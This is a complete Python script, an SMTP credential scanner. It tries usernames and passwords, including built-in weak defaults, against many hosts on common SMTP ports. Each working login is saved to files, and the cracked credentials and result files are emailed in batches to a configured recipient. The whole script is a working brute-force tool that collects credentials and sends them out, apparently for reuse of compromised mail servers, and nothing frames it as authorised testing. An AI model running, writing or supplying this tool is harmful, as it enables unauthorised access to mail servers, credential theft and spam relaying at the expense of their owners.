#!/usr/bin/env python3
import socket
import sys
import base64
import queue
import threading
import smtplib
import ssl
import time
import json
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import random
import os
from datetime import datetime
import logging

class SMTPScanner:
    def __init__(self, thread_count=10, verbose=False, debug=False):
        self.thread_count = int(thread_count)
        self.verbose = verbose
        self.debug = debug
        self.smtp_ports = [25, 465, 587, 2525]  # Common SMTP ports
        self.working_smtps = []
        self.lock = threading.Lock()
        self.scan_queue = queue.Queue()
        self.total_tested = 0
        self.start_time = time.time()
        
        # Email configuration for sending results
        self.notification_email = {
            'smtp_server': '',
            'smtp_port': 587,
            'email': '',
            'password': '',
            'recipient': '',
            'use_ssl': False
        }
        
        # Setup logging
        self.setup_logging()
        
    def setup_logging(self):
        """Setup logging configuration"""
        logging.basicConfig(
            level=logging.INFO if self.verbose else logging.WARNING,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('smtp_scanner.log'),
                logging.StreamHandler() if self.verbose else logging.NullHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)
        
    def load_config(self):
        """Load email configuration from config file"""
        try:
            if os.path.exists('email_config.json'):
                with open('email_config.json', 'r') as f:
                    config = json.load(f)
                    self.notification_email.update(config)
                    return True
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error loading config: {e}")
            self.logger.error(f"Error loading config: {e}")
        return False
    
    def create_config_template(self):
        """Create a template configuration file"""
        template = {
            "smtp_server": "smtp.gmail.com",
            "smtp_port": 587,
            "email": "your_sender_email@gmail.com",
            "password": "your_app_password_here",
            "recipient": "receiver@gmail.com",
            "use_ssl": False,
            "_instructions": {
                "smtp_server": "SMTP server address (e.g., smtp.gmail.com, smtp.outlook.com)",
                "smtp_port": "SMTP port (587 for TLS, 465 for SSL, 25 for plain)",
                "email": "Your sender email address",
                "password": "Your email password or app-specific password",
                "recipient": "Email address to receive the scan results",
                "use_ssl": "Set to true for port 465 (SSL), false for others"
            }
        }
        
        with open('email_config.json', 'w') as f:
            json.dump(template, f, indent=4)
        
        print("[INFO] Created email_config.json template. Please configure your email settings.")
        self.logger.info("Created email configuration template")
    
    def load_targets(self):
        """Load IP addresses, usernames, and passwords from files"""
        ips = []
        users = []
        passwords = []
        
        try:
            if os.path.exists('ips.txt'):
                with open('ips.txt', 'r') as f:
                    ips = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
            else:
                self.logger.warning("ips.txt not found")
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error loading IPs: {e}")
            self.logger.error(f"Error loading IPs: {e}")
        
        try:
            if os.path.exists('users.txt'):
                with open('users.txt', 'r') as f:
                    users = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error loading users: {e}")
            self.logger.error(f"Error loading users: {e}")
        
        try:
            if os.path.exists('pass.txt'):
                with open('pass.txt', 'r') as f:
                    passwords = [line.strip() for line in f if line.strip() and not line.strip().startswith('#')]
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error loading passwords: {e}")
            self.logger.error(f"Error loading passwords: {e}")
        
        return ips, users, passwords
    
    def test_smtp_connection(self, host, port, timeout=10):
        """Test basic SMTP connection"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)
            result = sock.connect_ex((host, port))
            sock.close()
            return result == 0
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Connection test failed for {host}:{port} - {e}")
            return False
    
    def test_smtp_auth(self, host, port, username, password):
        """Test SMTP authentication with improved error handling"""
        try:
            # Determine connection type based on port
            if port == 465:
                # SSL connection
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(host, port, context=context, timeout=15)
            else:
                # Regular connection
                server = smtplib.SMTP(host, port, timeout=15)
                
                # Try STARTTLS for non-SSL ports (except port 25 which might not support it)
                if port != 25:
                    try:
                        server.starttls(context=ssl.create_default_context())
                    except smtplib.SMTPNotSupportedError:
                        # Server doesn't support STARTTLS, continue without it
                        pass
                    except Exception as e:
                        if self.debug:
                            print(f"[DEBUG] STARTTLS failed for {host}:{port} - {e}")
            
            # Test authentication
            server.login(username, password)
            
            # Test sending capability (optional verification)
            try:
                server.noop()  # Simple command to verify connection is still active
            except:
                pass
            
            server.quit()
            return True
            
        except smtplib.SMTPAuthenticationError as e:
            if self.debug:
                print(f"[DEBUG] Auth failed for {username}@{host}:{port} - {e}")
            return False
        except smtplib.SMTPException as e:
            if self.debug:
                print(f"[DEBUG] SMTP error for {host}:{port} - {e}")
            return False
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Connection error for {host}:{port} - {e}")
            return False
    
    def get_smtp_info(self, host, port):
        """Get SMTP server information"""
        try:
            if port == 465:
                context = ssl.create_default_context()
                server = smtplib.SMTP_SSL(host, port, context=context, timeout=10)
            else:
                server = smtplib.SMTP(host, port, timeout=10)
                if port != 25:
                    try:
                        server.starttls(context=ssl.create_default_context())
                    except:
                        pass
            
            # Get server info
            welcome_msg = server.getwelcome()
            if isinstance(welcome_msg, bytes):
                welcome_msg = welcome_msg.decode('utf-8', errors='ignore')
            
            # Try to get EHLO response
            try:
                ehlo_resp = server.ehlo()
                if ehlo_resp[1]:
                    features = ehlo_resp[1]
                    if isinstance(features, bytes):
                        features = features.decode('utf-8', errors='ignore')
                else:
                    features = "N/A"
            except:
                features = "N/A"
            
            server.quit()
            return welcome_msg, features
            
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Info gathering failed for {host}:{port} - {e}")
            return "N/A", "N/A"
    
    def scan_worker(self):
        """Worker thread for scanning"""
        while True:
            try:
                item = self.scan_queue.get(timeout=1)
                if item is None:
                    break
                
                host, port, username, password = item
                
                with self.lock:
                    self.total_tested += 1
                    if self.total_tested % 100 == 0:
                        elapsed = time.time() - self.start_time
                        rate = self.total_tested / elapsed if elapsed > 0 else 0
                        print(f"[PROGRESS] Tested: {self.total_tested}, Rate: {rate:.1f}/sec, Found: {len(self.working_smtps)}")
                
                if self.verbose:
                    print(f"[SCAN] Testing {username}@{host}:{port}")
                
                # First test basic connection
                if not self.test_smtp_connection(host, port):
                    if self.debug:
                        print(f"[DEBUG] No connection to {host}:{port}")
                    self.scan_queue.task_done()
                    continue
                
                # Test authentication
                if self.test_smtp_auth(host, port, username, password):
                    # Get server info
                    welcome, features = self.get_smtp_info(host, port)
                    
                    smtp_info = {
                        'host': host,
                        'port': port,
                        'username': username,
                        'password': password,
                        'welcome': welcome,
                        'features': features,
                        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'connection_type': 'SSL' if port == 465 else 'TLS' if port in [587, 2525] else 'Plain'
                    }
                    
                    with self.lock:
                        self.working_smtps.append(smtp_info)
                        print(f"[SUCCESS] Working SMTP found: {username}@{host}:{port}")
                        self.logger.info(f"Working SMTP: {username}@{host}:{port}")
                        
                        # Save to file immediately
                        self.save_working_smtp(smtp_info)
                        
                        # Send immediate notification for each found SMTP
                        if len(self.working_smtps) % 5 == 0:  # Send batch updates every 5 finds
                            threading.Thread(target=self.send_batch_notification, daemon=True).start()
                
                self.scan_queue.task_done()
                
            except queue.Empty:
                break
            except Exception as e:
                if self.debug:
                    print(f"[DEBUG] Worker error: {e}")
                self.logger.error(f"Worker error: {e}")
                self.scan_queue.task_done()
    
    def save_working_smtp(self, smtp_info):
        """Save working SMTP to files"""
        try:
            # Simple format for easy parsing
            with open('working_smtps.txt', 'a') as f:
                f.write(f"{smtp_info['username']}:{smtp_info['password']}@{smtp_info['host']}:{smtp_info['port']}\n")
            
            # Detailed JSON format
            with open('working_smtps_detailed.json', 'a') as f:
                f.write(json.dumps(smtp_info) + '\n')
            
            # CSV format for spreadsheet import
            with open('working_smtps.csv', 'a') as f:
                if os.path.getsize('working_smtps.csv') == 0:
                    f.write("Host,Port,Username,Password,Connection_Type,Timestamp,Welcome_Message\n")
                f.write(f'"{smtp_info["host"]}",{smtp_info["port"]},"{smtp_info["username"]}","{smtp_info["password"]}","{smtp_info["connection_type"]}","{smtp_info["timestamp"]}","{smtp_info["welcome"][:100].replace('"', '""')}"\n')
                
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Error saving SMTP info: {e}")
            self.logger.error(f"Error saving SMTP info: {e}")
    
    def send_batch_notification(self):
        """Send notification for batch of found SMTPs"""
        if not self.working_smtps or not self.notification_email.get('recipient'):
            return
        
        try:
            # Create quick notification email
            msg = MIMEMultipart()
            msg['From'] = self.notification_email['email']
            msg['To'] = self.notification_email['recipient']
            msg['Subject'] = f"SMTP Scanner Update - {len(self.working_smtps)} Working SMTPs Found"
            
            body = f"""
SMTP Scanner Progress Update
============================

Scan Status: In Progress
Working SMTPs Found: {len(self.working_smtps)}
Last Update: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

Latest Working SMTPs:
"""
            
            # Show last 5 found SMTPs
            for smtp in self.working_smtps[-5:]:
                body += f"• {smtp['username']}@{smtp['host']}:{smtp['port']} ({smtp['connection_type']})\n"
            
            body += f"\nFull results will be sent when scan completes.\n"
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Send email quickly
            self._send_email(msg)
            
        except Exception as e:
            if self.debug:
                print(f"[DEBUG] Failed to send batch notification: {e}")
    
    def send_results_email(self):
        """Send comprehensive scan results via email"""
        if not all([self.notification_email['smtp_server'], 
                   self.notification_email['email'], 
                   self.notification_email['password'],
                   self.notification_email['recipient']]):
            print("[WARNING] Email configuration incomplete. Results saved to files only.")
            return
        
        try:
            # Create comprehensive email
            msg = MIMEMultipart()
            msg['From'] = self.notification_email['email']
            msg['To'] = self.notification_email['recipient']
            
            if self.working_smtps:
                msg['Subject'] = f"SMTP Scan Complete - {len(self.working_smtps)} Working SMTPs Found"
            else:
                msg['Subject'] = "SMTP Scan Complete - No Working SMTPs Found"
            
            # Create detailed email body
            elapsed_time = time.time() - self.start_time
            body = f"""
SMTP Scan Results - COMPLETE
=============================

Scan Summary:
• Start Time: {datetime.fromtimestamp(self.start_time).strftime('%Y-%m-%d %H:%M:%S')}
• End Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
• Duration: {elapsed_time/60:.1f} minutes
• Total Combinations Tested: {self.total_tested}
• Working SMTPs Found: {len(self.working_smtps)}
• Success Rate: {(len(self.working_smtps)/self.total_tested*100):.2f}%

"""
            
            if self.working_smtps:
                body += "Working SMTP Servers:\n"
                body += "=" * 50 + "\n"
                
                for i, smtp in enumerate(self.working_smtps, 1):
                    body += f"""
{i}. SMTP Server Details:
   Host: {smtp['host']}
   Port: {smtp['port']} ({smtp['connection_type']})
   Username: {smtp['username']}
   Password: {smtp['password']}
   Welcome: {smtp['welcome'][:150]}...
   Found: {smtp['timestamp']}
   
   Connection String: {smtp['username']}:{smtp['password']}@{smtp['host']}:{smtp['port']}
   
{'-'*50}
"""
                
                body += f"\n\nQuick Copy Format:\n"
                for smtp in self.working_smtps:
                    body += f"{smtp['username']}:{smtp['password']}@{smtp['host']}:{smtp['port']}\n"
            else:
                body += "No working SMTP servers were found during this scan.\n"
                body += "Consider:\n"
                body += "• Checking if the target hosts are reachable\n"
                body += "• Verifying username/password combinations\n"
                body += "• Ensuring ports are not blocked by firewalls\n"
            
            msg.attach(MIMEText(body, 'plain'))
            
            # Attach result files
            attachments = [
                ('working_smtps.txt', 'Simple format'),
                ('working_smtps.csv', 'CSV format for spreadsheets'),
                ('working_smtps_detailed.json', 'Detailed JSON format'),
                ('smtp_scanner.log', 'Scan log file')
            ]
            
            for filename, description in attachments:
                if os.path.exists(filename) and os.path.getsize(filename) > 0:
                    try:
                        with open(filename, 'rb') as attachment:
                            part = MIMEBase('application', 'octet-stream')
                            part.set_payload(attachment.read())
                            encoders.encode_base64(part)
                            part.add_header(
                                'Content-Disposition',
                                f'attachment; filename= "{filename}"'
                            )
                            msg.attach(part)
                    except Exception as e:
                        if self.debug:
                            print(f"[DEBUG] Failed to attach {filename}: {e}")
            
            # Send email
            self._send_email(msg)
            print(f"[SUCCESS] Complete results emailed to {self.notification_email['recipient']}")
            self.logger.info(f"Results emailed to {self.notification_email['recipient']}")
            
        except Exception as e:
            print(f"[ERROR] Failed to send results email: {e}")
            self.logger.error(f"Failed to send results email: {e}")
    
    def _send_email(self, msg):
        """Helper method to send email"""
        if self.notification_email['smtp_port'] == 465 or self.notification_email.get('use_ssl'):
            context = ssl.create_default_context()
            server = smtplib.SMTP_SSL(
                self.notification_email['smtp_server'], 
                self.notification_email['smtp_port'], 
                context=context,
                timeout=30
            )
        else:
            server = smtplib.SMTP(
                self.notification_email['smtp_server'], 
                self.notification_email['smtp_port'],
                timeout=30
            )
            if self.notification_email['smtp_port'] != 25:
                server.starttls(context=ssl.create_default_context())
        
        server.login(self.notification_email['email'], self.notification_email['password'])
        server.send_message(msg)
        server.quit()
    
    def run_scan(self):
        """Main scanning function"""
        print(f"[INFO] Starting SMTP scanner with {self.thread_count} threads")
        print(f"[INFO] Target ports: {', '.join(map(str, self.smtp_ports))}")
        
        # Load targets
        ips, users, passwords = self.load_targets()
        
        if not ips:
            print("[ERROR] No IPs found in ips.txt")
            return
        
        if not users:
            users = ['admin', 'user', 'test', 'mail', 'smtp', 'postmaster', 'root', 'noreply']
            print("[INFO] No users.txt found, using default usernames")
        
        if not passwords:
            passwords = ['password', '123456', 'admin', 'pass', 'test', '', 'mail', 'smtp', '12345']
            print("[INFO] No pass.txt found, using default passwords")
        
        # Populate scan queue
        total_combinations = 0
        for ip in ips:
            for port in self.smtp_ports:
                for user in users:
                    for password in passwords:
                        self.scan_queue.put((ip, port, user, password))
                        total_combinations += 1
        
        print(f"[INFO] Loaded {len(ips)} IPs, {len(users)} users, {len(passwords)} passwords")
        print(f"[INFO] Total combinations to test: {total_combinations}")
        print(f"[INFO] Estimated time: {(total_combinations / (self.thread_count * 2))/60:.1f} minutes")
        
        if self.notification_email.get('recipient'):
            print(f"[INFO] Results will be sent to: {self.notification_email['recipient']}")
        else:
            print("[INFO] No email recipient configured - results will be saved to files only")
        
        # Clear previous results
        for filename in ['working_smtps.txt', 'working_smtps.csv', 'working_smtps_detailed.json']:
            if os.path.exists(filename):
                os.remove(filename)
        
        self.start_time = time.time()
        
        # Start worker threads
        threads = []
        for i in range(self.thread_count):
            t = threading.Thread(target=self.scan_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        print("[INFO] Scan started. Press Ctrl+C to stop...")
        
        # Wait for completion
        try:
            self.scan_queue.join()
        except KeyboardInterrupt:
            print("\n[INFO] Scan interrupted by user")
            self.logger.info("Scan interrupted by user")
        
        # Stop threads
        for i in range(self.thread_count):
            self.scan_queue.put(None)
        
        for t in threads:
            t.join()
        
        elapsed_time = time.time() - self.start_time
        print(f"\n[INFO] Scan completed in {elapsed_time/60:.1f} minutes")
        print(f"[INFO] Found {len(self.working_smtps)} working SMTP servers")
        print(f"[INFO] Results saved to working_smtps.txt, working_smtps.csv, and working_smtps_detailed.json")
        
        # Send final results via email
        if self.working_smtps or self.notification_email.get('recipient'):
            self.send_results_email()

def create_sample_files():
    """Create sample input files if they don't exist"""
    if not os.path.exists('ips.txt'):
        with open('ips.txt', 'w') as f:
            f.write("# Add IP addresses or hostnames to scan, one per line\n")
            f.write("# Examples:\n")
            f.write("# 192.168.1.100\n")
            f.write("# mail.example.com\n")
            f.write("# smtp.company.com\n")
        print("[INFO] Created sample ips.txt file")
    
    if not os.path.exists('users.txt'):
        with open('users.txt', 'w') as f:
            f.write("# Common usernames to test\n")
            f.write("admin\nuser\ntest\nmail\nsmtp\npostmaster\nroot\nnoreply\nsupport\ninfo\n")
        print("[INFO] Created sample users.txt file")
    
    if not os.path.exists('pass.txt'):
        with open('pass.txt', 'w') as f:
            f.write("# Common passwords to test\n")
            f.write("password\n123456\nadmin\npass\ntest\n\nmail\nsmtp\n12345\npassword123\n")
        print("[INFO] Created sample pass.txt file")

def main():
    print("SMTP Scanner v2.0 - Enhanced Email Notification Version")
    print("=" * 60)
    
    if len(sys.argv) < 2:
        print("Usage: python3 smtp_scanner.py <threads> [verbose] [debug]")
        print("       python3 smtp_scanner.py a  (to create sample files)")
        print("\nExamples:")
        print("  python3 smtp_scanner.py 10 1 1    # 10 threads, verbose, debug")
        print("  python3 smtp_scanner.py 20 1 0    # 20 threads, verbose, no debug")
        print("  python3 smtp_scanner.py a         # Create sample files")
        sys.exit(1)
    
    # Handle file creation mode
    if str(sys.argv[1]) == 'a':
        create_sample_files()
        scanner = SMTPScanner()
        if not scanner.load_config():
            scanner.create_config_template()
        print("\n[INFO] Setup complete! Configure email_config.json and add targets to the .txt files")
        sys.exit(0)
    
    try:
        thread_count = int(sys.argv[1])
        verbose = len(sys.argv) > 2 and sys.argv[2] == '1'
        debug = len(sys.argv) > 3 and sys.argv[3] == '1'
        
        if thread_count < 1 or thread_count > 100:
            print("[ERROR] Thread count should be between 1 and 100")
            sys.exit(1)
        
        scanner = SMTPScanner(thread_count, verbose, debug)
        
        # Load email configuration
        if not scanner.load_config():
            print("[WARNING] No email configuration found. Creating template...")
            scanner.create_config_template()
            print("[INFO] Please configure email_config.json for email notifications")
            print("[INFO] Scan will continue and save results to files")
        
        scanner.run_scan()
        
    except ValueError:
        print("[ERROR] Invalid thread count. Please provide a number.")
        sys.exit(1)
    except KeyboardInterrupt:
        print("\n[INFO] Scanner interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        logging.exception("Unexpected error occurred")
        sys.exit(1)

if __name__ == "__main__":
    main()